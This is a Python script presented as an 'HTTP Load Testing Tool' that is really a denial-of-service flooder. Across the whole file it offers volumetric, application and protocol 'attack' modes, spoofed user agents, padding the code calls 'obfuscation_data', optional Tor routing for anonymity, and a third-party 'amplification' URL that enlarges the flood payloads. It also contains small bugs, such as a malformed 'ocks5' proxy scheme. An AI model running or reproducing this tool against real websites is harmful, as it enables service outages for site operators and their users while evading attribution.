#!/usr/bin/python3
import argparse
import requests
import threading
import random
import string
import time
import sys
import os
import psutil
import logging
from urllib3.util.retry import Retry
from requests.adapters import HTTPAdapter
from queue import Queue
from threading import Thread
from random import randint
import json
from colorama import init, Fore, Style
import pyfiglet
from termcolor import colored

init(autoreset=True)

class HTTPLoadTester:
    def __init__(self):
        self.session = requests.Session()
        self.retries = Retry(total=5, backoff_factor=1, status_forcelist=[500, 502, 503, 504])
        self.adapter = HTTPAdapter(max_retries=self.retries, pool_connections=100, pool_maxsize=100)
        self.session.mount('http://', self.adapter)
        self.session.mount('https://', self.adapter)
        self.response_times = []
        self.lock = threading.Lock()
        self.error_count = 0
        self.request_queue = Queue()
        self.logger = logging.getLogger('http_load_tester')
        self.logger.setLevel(logging.INFO)
        self.logger.addHandler(logging.FileHandler('httpdus3.log'))

    def generate_user_agent(self):
        platforms = ['Macintosh; Intel Mac OS X 10_15_7', 'Windows NT 10.0; Win64; x64', 'X11; Linux x86_64', 'Linux armv7l']
        browsers = ['Chrome', 'Firefox', 'Safari', 'Opera', 'Edge', 'Internet Explorer']
        versions = [''.join(random.choices(string.digits, k=2)) + '.0']
        return random.choice(browsers) + '/' + random.choice(versions) + '' + random.choice(platforms) + ')'

    def generate_random_data(self, length):
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

    def send_request(self, url, amplification_data, obfuscation_data, use_tor=False, custom_headers=None, packet_size=None):
        headers = {
            'User-Agent': self.generate_user_agent(),
            'Accept-Encoding': 'gzip, deflate',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Connection': 'keep-alive',
        }

        if custom_headers:
            headers.update(custom_headers)

        proxies = None
        if use_tor:
            proxies = {
                'http': 'ocks5://127.0.0.1:9050',
                'https': 'ocks5://127.0.0.1:9050'
            }

        try:
            start_time = time.time()
            if packet_size:
                payload = amplification_data + obfuscation_data.encode()[:packet_size]
            else:
                payload = amplification_data + obfuscation_data.encode()
            response = self.session.post(url, headers=headers, data=payload, timeout=10, proxies=proxies)
            elapsed_time = time.time() - start_time
            with self.lock:
                self.response_times.append(elapsed_time)
            self.logger.info(f"Response from {url}: {response.status_code} (Time: {elapsed_time:.2f} seconds)")
            print(f"Response from {url}: {response.status_code} (Time: {elapsed_time:.2f} seconds)")
        except requests.exceptions.RequestException as e:
            self.logger.error(f"Error sending request to {url}: {e}")
            print(f"Error sending request to {url}: {e}")
            with self.lock:
                self.error_count += 1

    def worker(self):
        while True:
            url, amplification_data, obfuscation_data, use_tor, custom_headers, packet_size = self.request_queue.get()
            self.send_request(url, amplification_data, obfuscation_data, use_tor, custom_headers, packet_size)
            self.request_queue.task_done()

    def volumetric_attack(self, url, num_requests, amplification_data, obfuscation_data, use_tor=False, custom_headers=None, packet_size=None):
        for _ in range(num_requests):
            self.request_queue.put((url, amplification_data, obfuscation_data, use_tor, custom_headers, packet_size))

    def application_layer_attack(self, url, num_requests, obfuscation_data, use_tor=False, custom_headers=None, packet_size=None):
        for _ in range(num_requests):
            self.request_queue.put((url, b'', obfuscation_data, use_tor, custom_headers, packet_size))

    def protocol_attack(self, url, num_requests, amplification_data, use_tor=False, custom_headers=None, packet_size=None):
        for _ in range(num_requests):
            self.request_queue.put((url, amplification_data, b'', use_tor, custom_headers, packet_size))
            
    def run_attack(self, url, num_threads, num_requests, attack_type, amplification_url=None, use_tor=False, custom_headers=None, packet_size=None):
        amplification_data = self.session.get(amplification_url).content if amplification_url else b''
        obfuscation_data = self.generate_random_data(random.randint(100, 1000))

        for _ in range(num_threads):
            thread = Thread(target=self.worker)
            thread.daemon = True
            thread.start()

        if attack_type == 'volumetric':
            self.volumetric_attack(url, num_requests, amplification_data, obfuscation_data, use_tor, custom_headers, packet_size)
        elif attack_type == 'application':
            self.application_layer_attack(url, num_requests, obfuscation_data, use_tor, custom_headers, packet_size)
        elif attack_type == 'protocol':
            self.protocol_attack(url, num_requests, amplification_data, use_tor, custom_headers, packet_size)
        else:
            self.logger.error("Invalid attack type")
            print("Invalid attack type")
            return

        self.request_queue.join()

    def run_wizard(self):
        print("Welcome to HTTP Load Testing Tool Wizard")
        print("---------------------------------------")

        url = input("Enter the URL you want to send requests to: ")
        num_threads = int(input("Enter the number of threads you want to use: "))
        num_requests = int(input("Enter the number of requests for each thread: "))
        attack_type = input("Choose attack type (volumetric/application/protocol): ").lower()
        amplification_url = input("Enter the URL of a third-party server for amplification (optional): ")
        use_tor = input("Do you want to use Tor for anonymity? (y/n): ").lower() == 'y'
        packet_size = int(input("Enter the packet size (bytes) or 0 for default: "))

        custom_headers = {}
        add_custom_headers = input("Do you want to add custom headers? (y/n): ").lower() == 'y'
        if add_custom_headers:
            while True:
                header = input("Enter header (key:value) or 'done' to finish: ")
                if header.lower() == 'done':
                    break
                key, value = header.split(':')
                custom_headers[key.strip()] = value.strip()

        self.run_attack(url, num_threads, num_requests, attack_type, amplification_url, use_tor, custom_headers, packet_size)

    def real_time_monitoring(self):
        while True:
            time.sleep(5)
            with self.lock:
                if self.response_times:
                    avg_response_time = sum(self.response_times) / len(self.response_times)
                    self.logger.info(f"Average response time: {avg_response_time:.2f} seconds")
                    print(f"Average response time: {avg_response_time:.2f} seconds")
                    self.logger.info(f"Error count: {self.error_count}")
                    print(f"Error count: {self.error_count}")
                else:
                    self.logger.info("No requests yet.")
                    print("No requests yet.")

    def load_config(self, config_file):
        try:
            with open(config_file, 'r') as file:
                config = json.load(file)
            return config
        except FileNotFoundError:
            self.logger.error(f"Configuration file {config_file} not found.")
            print(f"Configuration file {config_file} not found.")
            return None
        except json.JSONDecodeError:
            self.logger.error(f"Error decoding configuration file {config_file}.")
            print(f"Error decoding configuration file {config_file}.")
            return None

    def parse_arguments(self):
        parser = argparse.ArgumentParser(description="HTTP Load Testing Tool")
        parser.add_argument("-w", "--wizard", action="store_true", help="Run the tool in wizard mode")
        parser.add_argument("--tor", action="store_true", help="Use Tor for anonymity")
        parser.add_argument("--config", help="Path to configuration file")
        parser.add_argument("url", nargs='?', help="The URL to send requests to")
        parser.add_argument("-t", "--threads", type=int, default=1, help="Number of threads to use (default: 1)")
        parser.add_argument("-r", "--requests", type=int, default=1, help="Number of requests per thread (default: 1)")
        parser.add_argument("-a", "--amplification-url", help="URL of third-party server for amplification")
        parser.add_argument("-at", "--attack-type", choices=['volumetric', 'application', 'protocol'],
                            help="Choose attack type (volumetric/application/protocol)")
        parser.add_argument("--monitor", action="store_true", help="Enable real-time monitoring")
        parser.add_argument("-ch", "--custom-headers", nargs='*', help="Custom headers in key:value format")
        parser.add_argument("-ps", "--packet-size", type=int, default=None, help="Packet size (bytes), 0 for default")
        args = parser.parse_args()

        custom_headers = None
        if args.custom_headers:
            custom_headers = {}
            for header in args.custom_headers:
                key, value = header.split(':')
                custom_headers[key.strip()] = value.strip()

        if args.wizard:
            self.run_wizard()
        elif args.monitor:
            monitoring_thread = threading.Thread(target=self.real_time_monitoring)
            monitoring_thread.start()
            self.run_attack(args.url, args.threads, args.requests, args.attack_type,
                            args.amplification_url, args.tor, custom_headers, args.packet_size)
        elif args.config:
            config = self.load_config(args.config)
            if config:
                self.run_attack(config.get('url'), config.get('threads', 1), config.get('requests', 1),
                                config.get('attack_type'), config.get('amplification_url'),
                                config.get('use_tor', False), config.get('custom_headers'), config.get('packet_size'))
        else:
            if args.url:
                self.run_attack(args.url, args.threads, args.requests, args.attack_type,
                                args.amplification_url, args.tor, custom_headers, args.packet_size)
            else:
                parser.print_help()

if __name__ == "__main__":
    tester = HTTPLoadTester()
    tester.parse_arguments()
